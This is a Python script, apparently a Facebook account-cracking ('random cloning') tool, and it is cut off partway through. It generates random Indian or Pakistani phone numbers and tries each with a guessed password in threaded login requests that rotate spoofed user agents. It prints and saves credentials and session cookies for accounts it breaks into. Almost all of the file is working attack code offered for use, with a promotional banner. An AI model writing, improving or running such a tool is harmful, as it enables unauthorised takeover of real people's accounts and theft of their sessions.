#!/usr/bin/python3
#-*-coding:utf-8-*-
import os

try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
    
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
    
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python num.py')
	ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    #ugen.append(uaku2)
#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    
  ###----------[ USER AGENT ]---------- ###
  
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
agents = ['Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/230.0.474234691 Mobile/15E148 Safari/604.1'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v6602998728350062039 t7953522583624103269 ath5ee645e0 altpriv cvcv=2 smf=0'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 RuxitSynthetic/1.0 v3511156157 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v1655061440183282881 t2057609852430076409 ath2653ab72 altpriv cvcv=2 smf=0'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v78825882747536779 t6472357947910485163 ath5ee645e0 altpriv cvcv=2 smf=0'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6745133222030416716 t6543897075487374146 athe94ac249 altpriv cvcv=2 smf=0'
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_6_1) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/85.0.4653.12 Safari/533.2 Edg/85.01049.24'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/536.1 (KHTML, like Gecko) Version/15.0 EdgiOS/99.01071.3 Mobile/15E148 Safari/536.1'
'Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.48.5 (KHTML, like Gecko) Version/4.0.1 Safari/534.48.5'
'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/82.0.4837.81 Safari/537.1 EdgA/82.01100.99'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4 rv:6.0; nl-NL) AppleWebKit/532.48.7 (KHTML, like Gecko) Version/4.0.2 Safari/532.48.7'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Safari/605.1.15'
'https://user-agents.net/string/mozilla-5-0-x11-linux-x86-64-applewebkit-537-36-khtml-like-gecko-headlesschrome-84-0-4143-2-safari-537-36'
'Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 10; SM-S215DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0; CRO-L02) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/61.2.3076.56749'
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/528.11 (KHTML, like Gecko) Chrome/2.0.157.0 Safari/528.11'
'Mozilla/5.0 (Linux; U; Android 10; en-US; V2043 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.1781.125 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.2854.97 Safari/537.36'
'Mozilla/5.0 (Linux; Android 7.0; TECNO CX Air) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.0 Safari/537.36'
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/78.0.3904.67 Mobile/15E148 Safari/604.1'
'Mozilla/5.0 (Linux; Android 10; Moto X4 Build/QQ3A.200805.001; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.6.1(20652) Chrome/88.0.4324.152 Mobile Safari/537.36'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 OPR/73.0.3856.427'
'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2846.96 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2691.45 Safari/537.36'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.75'
'Mozilla/5.0 (Linux; Android 10; MI 9 Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045525 Mobile Safari/537.36 MMWEBID/9173 MicroMessenger/8.0.2.1860(0x2800023B) Process/tools WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64'
'Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)'
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBIOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]'
'Mozilla/5.0 (Linux; Android 8.0.0; G3112) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; arm_64; Android 10; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 YaBrowser/20.4.0.237.00 SA/1 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 7.1.1; T20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0; Lenovo A6600d40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 9; SM-J330F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 YandexSearch/6.45'
'Mozilla/5.0 (Linux; U; Android 8.0.0; HTC 10 Build/OPR1.170623.027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 OPR/47.2.2254.147957'
'Mozilla/5.0 (Linux; Android 7.0; F5121) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; arm_64; Android 11; RMX2001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.5.90.00 SA/3 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]'
'Mozilla/5.0 (Linux; Android 9; RMX2030 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]'
'Mozilla/5.0 (Linux; arm_64; Android 10; SM-A405FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaApp_Android/23.12.1 YaSearchBrowser/23.12.1 BroPP/1.0 SA/3 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; arm_64; Android 10; RMX2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaApp_Android/23.14.1 YaSearchBrowser/23.14.1 BroPP/1.0 SA/3 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; arm_64; Android 13; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaApp_Android/23.16.1 YaSearchBrowser/23.16.1 BroPP/1.0 (beta) SA/3 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 13; 21081111RG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446'
'Mozilla/5.0 (Linux; Android 9; moto e(6) plus Build/PTAS29.401-36-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]'
'Mozilla/5.0 (Linux; Android 11; 2201117SY Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446'
'Mozilla/5.0 (Linux; arm_64; Android 8.1.0; ASUS_X018D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.5.90.00 SA/3 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 8.0.0; G8441) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 8.1.0; LM-X220PM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 7.1.1; CPH1725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 7.0; V120 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 YandexSearch/9.85 YandexSearchWebView/9.85'
"AndroidDownloadManager/7.0 (Linux; U; Android 7.0; ASUS_X00KD Build/NRD90M)",
"Football Top One 1.0.5 (iPad; iPhone OS 9.3.5; en_US)",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v2844481404568756785 t4679433443537245834 ath2653ab72 altpriv cvcv=2 cexpw=1 smf=0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v1015911174033287968 t1412992623617827089 athe94ac249 altpriv cvcv=2 cexpw=1 smf=0",
"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A326B/A326BXXU5CWDC) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; GM1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; Mi 9 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.0.271.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; M2012K11AG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]",
"Mozilla/5.0 (Linux; Android 13; CPH2273 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022143610",
"Mozilla/5.0 (Linux; Android 9; LM-X320 Build/PKQ1.190414.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022140634",
"Mozilla/5.0 (Linux; Android 13; M2101K9G Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 GNews Android/2022129690",
"Mozilla/5.0 (Linux; Android 10; MI 8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-A135F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022143610",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Config/94.2.9141.42",]  
  
logo = """       
\033[1;31m █████╗ ██╗     ██╗██╗   ██╗ █████╗ ███╗   ██╗
\033[1;32m██╔══██╗██║     ██║╚██╗ ██╔╝██╔══██╗████╗  ██║
\033[1;33m███████║██║     ██║ ╚████╔╝ ███████║██╔██╗ ██║
\033[1;34m██╔══██║██║     ██║  ╚██╔╝  ██╔══██║██║╚██╗██║
\033[1;35m██║  ██║███████╗██║   ██║   ██║  ██║██║ ╚████║
\033[1;36m╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
                                              

                                                 
\033[1;32m(⁠^⁠^⁠)(⁠・⁠∀⁠・⁠)(⁠・⁠∀⁠・⁠)(⁠・⁠∀⁠・⁠)(⁠・⁠∀⁠・⁠)
\033[1;32m[🇮🇳] \033[1;33mCREATED BY   :  \033[1;33mALIYAN
\033[1;32m[🇮🇳] \033[1;34mON FACEBOK   :  \033[1;34mSHAIKH
\033[1;32m[🇮🇳] \033[1;35mON GITHUB    :  \033[1;35mALIYANX786
\033[1;32m[🇮🇳] \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m[🇮🇳] \033[1;36mBEST FRIEND  :  \033[1;36mALIYAN-X-KING
\033[1;32m(⁠^⁠^⁠)(⁠・⁠∀⁠・⁠)(⁠・⁠∀⁠・⁠)(⁠・⁠∀⁠・⁠)(⁠・⁠∀⁠・⁠)\n\n"""  
loop = 0
oks = []
cps = []

#global functions
def dynamic(text):
	titik = ['.   ','..  ','... ','.... ']
	for o in titik:
		print('\r'+text+o),
		sys.stdout.flush();time.sleep(1)
def menu():
	os.system('clear')
	print(logo)
	print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print('[1] RANDOM CLONING ')
	print('[2] FOLLOWE MY FB')
	print('[0] EXIT')
	print(47*"-")
	opt = input('[?] Choose : ')
	if opt =='1':
		random_crack()
	if opt =='2':
		os.system("xdg-open https://www.facebook.com/100064172587843")
		menu()
    #if opt =='0':
    	#exit()
    #else:
    	#print('GALT CHOICE YOUR CODE🥺')
    #menu()
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r Ã°Å¸Å½Â®  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r Ã°Å¸Å½Â®  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
   
def random_crack():
	os.system('clear')
	print(logo)
	print('[1]\033[1;32m INDIA RANDOM CLONE')
	print('[2]\033[1;36m PAK 🇵🇰  RANDOM CLONE')
	print('[0]\033[1;33m BANGAL RANODOM CLONE')
	print(47*'-')
	opt = input('[?] Choose : ')
	if opt =='1':
		random_number()
	elif opt =='2':
		random_pak_number()
	elif opt =='0':
		menu()
	else:
		print('\033[1;91mChoose valid option\033[0;97m')

def random_number():
	user=[]
	os.system('clear')
	print(logo)
	print("\033[1;32m INDIA code : 9670,9919,9918,8795,9915")
	print(47*'-')
	kode = input('[?] Choice sim Code : ')
	print(47*'-')
	os.system('clear')
	print(logo)
	print(' EXAMPLE CLONE : 2000  3000 4000 5000')
	print('=========================================')
	limit = int(input('[?]\033[1;35m LIMIT CLONE : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(47*'-')
		print('[+] TOTAL YOUR IDS  : \033[1;92m'+tl)
		print('[?] \033[1;35mCHOICE SIM CODE : \033[1;32m'+kode)
		print('\033[1;37;1m[•] CHOICE YUR CONTORY :(\033[1;96mINDIA\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru]
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	print(' Press Inter To Back Menu')
	menu()
	
    
def rcrack(uid,pwx,tl):
	global loop
	global oks
	global agents
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(agents)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'www.facebook.com',
            'method': 'POST',
			'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,}
			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\033[1;92m[ALIYAN-OK] '+uid+' | '+ps+'\033[0;97m')
				print(f"\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('ALIYAN-ok.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\n\033[1;91m[ALIYAN-CP] '+uid+' | '+ps+'\033[0;97m')
				#print(f"\n\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f'\r\033[m[ALIYAN] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
		sys.stdout.flush()
	except:
		pass

def random_pak_number():
	user=[]
	os.system('clear')
	print(logo)
	print('[+] PK code  : 92303,92306,92309,92305,92307')
	print(47*'-')
	kode = input('[?] Choice Code : ')
	os.system('clear')
	print(logo)
	print(' EXAMPLE CLONE : 2000  3000 4000 5000')
	print('=========================================')
	limit = int(input('[?] CLONE LIMIT : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(47*'-')
		print('[+] YOUR TOTAL IDS : \033[1;92m'+tl)
		print('[?] \033[1;35mCHOICE SIM CODE : \033[1;32m'+kode)
		print('\033[1;37;1m[•] YOUR CONTORY (\033[1;92mPakistan\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
